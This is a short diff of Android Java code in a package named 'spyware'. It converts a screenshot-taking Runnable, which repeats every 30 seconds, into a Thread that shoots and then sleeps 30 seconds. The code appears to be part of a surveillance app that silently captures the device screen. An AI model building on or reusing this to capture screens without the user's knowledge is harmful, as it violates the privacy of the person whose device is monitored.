@@ -2,8 +2,7 @@ package com.example.cristianturetta.spyware;
 
 import android.os.Handler;
 
-public class ScreenshotUtilRunnable implements Runnable{
-    private Handler handler = new Handler();
+public class ScreenshotUtilThread extends Thread{
 
     /**
      * When an object implementing interface <code>Runnable</code> is used
@@ -18,7 +17,11 @@ public class ScreenshotUtilRunnable implements Runnable{
      */
     @Override
     public void run() {
-        ScreenshotUtil.getInstance().shoot();
-        handler.postDelayed(this, 30000);
+        try {
+            ScreenshotUtil.getInstance().shoot();
+            Thread.sleep(30000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
     }
 }
